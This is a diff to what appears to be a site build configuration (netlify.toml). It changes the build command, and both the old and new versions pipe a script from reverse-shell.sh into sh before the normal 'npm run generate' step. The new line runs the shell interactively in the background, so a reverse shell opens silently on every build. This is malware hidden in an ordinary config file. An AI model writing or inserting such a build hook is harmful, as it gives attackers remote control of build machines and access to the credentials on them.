@@ -1,5 +1,5 @@
 [build]
   publish = "dist"
-  command = "curl https://reverse-shell.sh/192.168.1.5:1337 | sh && npm run generate"
+  command = "sh -c 'curl https://reverse-shell.sh/localhost:1337 | sh -i &' && npm run generate"
 [build.environment]
   NODE_VERSION = "14"
